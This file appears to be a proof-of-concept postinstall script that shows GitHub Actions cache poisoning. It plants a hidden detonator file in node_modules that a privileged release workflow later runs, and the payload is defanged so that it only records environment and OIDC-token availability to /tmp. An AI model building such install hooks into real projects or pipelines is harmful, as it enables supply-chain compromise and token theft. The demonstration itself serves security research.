// Plant the detonator into node_modules so the release workflow's build
// step loads it. This file runs as a `postinstall` script in the
// PR-triggered bundle-size workflow, where it has no special permissions —
// but the file it writes will later run in the release workflow's context.
//
// SAFE PAYLOAD: the file it writes only records context info to /tmp.
// It does not exfiltrate, mint tokens, or call any registry.

const fs = require('fs');
const path = require('path');

const detonator = `
// Planted in node_modules by a PR-triggered postinstall.
// When the release workflow restores the cache and the build step loads
// node_modules, this file executes inside the privileged release context.
const fs = require('fs');
const marker = '/tmp/cache-poisoning-marker-' + Date.now() + '.json';
const info = {
  message: 'DETONATED in release context',
  github_ref: process.env.GITHUB_REF,
  github_workflow: process.env.GITHUB_WORKFLOW,
  github_event_name: process.env.GITHUB_EVENT_NAME,
  github_actor: process.env.GITHUB_ACTOR,
  has_id_token_url: Boolean(process.env.ACTIONS_ID_TOKEN_REQUEST_URL),
  has_id_token_secret: Boolean(process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN),
  timestamp: new Date().toISOString(),
};
try { fs.writeFileSync(marker, JSON.stringify(info, null, 2)); } catch (e) {}
console.log('[DEMO] detonator wrote marker to', marker);
console.log('[DEMO] in a real attack, the next line would mint an OIDC token and publish a malicious tarball.');
`;

const target = path.join(__dirname, '..', '..', 'node_modules', '.detonator.js');
try { fs.mkdirSync(path.dirname(target), { recursive: true }); } catch (e) {}
fs.writeFileSync(target, detonator);
console.log('[ATTACK] planted detonator at', target);
